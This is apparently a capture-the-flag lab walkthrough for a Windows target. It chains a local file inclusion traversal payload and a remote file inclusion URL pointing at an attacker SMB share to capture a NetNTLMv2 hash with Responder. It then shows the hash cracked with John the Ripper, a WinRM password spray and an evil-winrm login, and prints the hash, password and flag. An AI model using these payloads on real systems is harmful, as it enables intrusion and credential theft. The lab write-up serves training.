# Responder

> This lab focuses on how a File Inclusion vulnerability on a webpage being served on a Windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server. We will use a utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper to test millions of potential passwords to see if they match the one used to create the hash. 

Walk-Through below (end of file)

----
-  TARGET MACHINE IP ADDRESS: 10.129.95.234  
----
## Nmap

```
nmap -Pn -p 1-10000 10.129.95.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 20:28 EST
Nmap scan report for 10.129.95.234
Host is up (0.058s latency).
Not shown: 9997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman         #             <--- winrm
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 299.84 seconds


nmap -Pn -sS -sV -sC -O -T4 -p 80,5985,7680 10.129.95.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 20:41 EST
Nmap scan report for 10.129.95.234
Host is up (0.17s latency).

PORT     STATE    SERVICE   VERSION
80/tcp   filtered http
5985/tcp filtered wsman
7680/tcp filtered pando-pub
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|VoIP phone|general purpose|phone
Running: Allen-Bradley embedded, Atcom embedded, Microsoft Windows 7|8|Phone|XP|2012, Palmmicro embedded, VMware Player
OS CPE: cpe:/h:allen-bradley:micrologix_1100 cpe:/h:atcom:at-320 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2012 cpe:/a:vmware:player
OS details: Allen Bradley MicroLogix 1100 PLC, Atcom AT-320 VoIP phone, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 Update 1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012, Palmmicro AR1688 VoIP module, VMware Player virtual NAT device

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
```

## Nmap: min-rate

```
nmap -p- --min-rate 1000 -sV 10.129.95.234 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 20:52 EST
Nmap scan report for 10.129.95.234
Host is up (0.083s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.20 seconds
```
## masscan
```
masscan 10.129.95.234 -p1-65535,U:1-65535 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-02-23 01:33:48 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 5985/tcp on 10.129.95.234  
```

## Browser
- `http://10.129.95.234 ` redirects to `http://unika.htb/`
- Same as ignition (previous box): virtual hosting (add to `/etc/hosts`)

----
## Netcat
### Port 80

```
nc -nv 10.129.95.234 80
(UNKNOWN) [10.129.95.234] 80 (http) open

HTTP/1.1 400 Bad Request
Date: Fri, 23 Feb 2024 01:42:26 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
Content-Length: 325
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at unika.htb Port 80</address>
</body></html>
```

### Port 5985

```
nc -nv 10.129.95.234 5985
(UNKNOWN) [10.129.95.234] 5985 (?) open
```

### Port 7680

```
nc -nv 10.129.95.234 7680
(UNKNOWN) [10.129.95.234] 7680 (?) open
```

----
-  Respawned: 10.129.99.141  
----

## Virtual Host

- This is another virtual hosting set-up. You need to include an IP-to-domain mapping in your `/etc/hosts` file. Then you can open the site in a browser. 
- Once you do, then check out the language menu item on the right side of the top menu bar.
- Change the language from English to either of the choices provided. You'll see that the URL includes the following: 

```
http://unika.htb/index.php?page=german.html
#                          |--> this parameter might be vulnerable if not sanitized
```

### [URL Parameters](https://www.semrush.com/blog/url-parameters/)

![original](https://github.com/GregKedrovsky/Hacking/assets/26492233/dd90a6d0-02fb-4262-84f0-a67a3054cf1b)

## LFI ([Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)) Vulnerability

> LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the `../` string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

```
http://unika.htb/index.php?page=french.html
# Test the "page" parameter to see if a directory traversal is accepted... 
# Test it with files common to all Windows installs (common file, common location)

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

# Positive Results:
# Copyright (c) 1993-2009 Microsoft Corp. 
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows. 
# This file contains the mappings of IP addresses to host names. 
# Each # entry should be kept on an individual line. 
# The IP address should # be placed in the first column followed by the corresponding 
# host name. 
# The IP address and the host name should be separated by at least one # space.
# Additionally, comments (such as these) may be inserted on individual # lines or 
# following the machine name denoted by a '#' symbol. 
# For example: 
# # 102.54.94.97 rhino.acme.com # source server 
# # 38.25.63.10 x.acme.com # x client host 
# localhost name resolution is handled within DNS itself.
# 127.0.0.1 localhost # ::1 localhost
```

### RFI ([Remote File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)) Vulnerability

> Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.

```
# Example: 
http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
```

## crackmapexec

```
crackmapexec winrm 10.129.99.141 -u administrator -p /usr/share/wordlists/metasploit/password.lst

# Positive Result: 
WINRM  10.129.99.141  5985  NONE  [+] None\administrator:badminton (Pwn3d!)
```

----
-  Respawned: 10.129.95.234
----

## Using Responder

### Start responder:

```
responder -I [network_interface]
```

### RFI (Remote File Inclusion): Capture the Hash
- With the Responder server ready, we tell the server to include a resource from our SMB server by setting the page parameter as follows via the web browser.

```
http://unika.htb/?page=//[attack machine ip]/somefile
```

- Because in this scenario we have the freedom to specify the address for the SMB share, we specify the IP address of our attacking machine. 
- Now the server tries to load the resource from our SMB server, and Responder captures enough of that to get the NetNTLMv2.
- Note: Make sure to add `http://` in the address as some browsers might opt for a Google search instead of navigating to the appropriate page.
- After sending our payload through the web browser we get an error in the browser about not being able to load the requested file (because it doesn't exist and we don't care because...).
### Responder Capture the Hash
- On checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
- The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

```
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:9f588ec010af5d68:4BFAFABBB79B9B1A0104A82BB0D3DB2D:0101000000000000809ED6830C67DA011611E316DB09ED7900000000020008004C004B003100580001001E00570049004E002D004F00300034004D004F004F00530046004D003200340004003400570049004E002D004F00300034004D004F004F00530046004D00320034002E004C004B00310058002E004C004F00430041004C00030014004C004B00310058002E004C004F00430041004C00050014004C004B00310058002E004C004F00430041004C0007000800809ED6830C67DA010600040002000000080030003000000000000000010000000020000002F44D4DF31257C5FAA63A38652FD4A82B473A2B0D4893AE6C495EEF60A2B9DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320035000000000000000000
```

### Crack the Hash
- Copy the Admin hash to a text file: 
```
vim hash.txt 

# Result: 
cat hash.txt 
Administrator::RESPONDER:9f588ec010af5d68:4BFAFABBB79B9B1A0104A82BB0D3DB2D:0101000000000000809ED6830C67DA011611E316DB09ED7900000000020008004C004B003100580001001E00570049004E002D004F00300034004D004F004F00530046004D003200340004003400570049004E002D004F00300034004D004F004F00530046004D00320034002E004C004B00310058002E004C004F00430041004C00030014004C004B00310058002E004C004F00430041004C00050014004C004B00310058002E004C004F00430041004C0007000800809ED6830C67DA010600040002000000080030003000000000000000010000000020000002F44D4DF31257C5FAA63A38652FD4A82B473A2B0D4893AE6C495EEF60A2B9DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320035000000000000000000
```
- NOTE: Make sure you delete any and all whitespace following the hash. There should be no new-lines or spaces after the last hash character.
- John the Ripper to crack: 

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt 

# Output: 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2024-02-24 12:21) 3.846g/s 15753p/s 15753c/s 15753C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

### Exploit with Evil-WinRM
- Use `evil-winrm` to login to the target machine via WinRm:

```
evil-winrm -u Administrator -p badminton -i 10.129.95.234
```

- Find the flag using the [Powershell equivalent of find](https://jessitron.com/2020/04/23/powershell-equivalent-of-find/)

```
*Evil-WinRM* PS C:\Users\Administrator> cd /
*Evil-WinRM* PS C:\> gci -r -fi 'flag*.*'


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

```

- cat the flag: 

```
*Evil-WinRM* PS C:\users\mike\desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```

![Pasted image 20240224112845](https://github.com/GregKedrovsky/Hacking/assets/26492233/7d66d7b3-52a7-40c2-a531-a6ae8e2131c6)

[walkthrough_013_responder.pdf](https://github.com/GregKedrovsky/Hacking/files/14625848/walkthrough_013_responder.pdf)

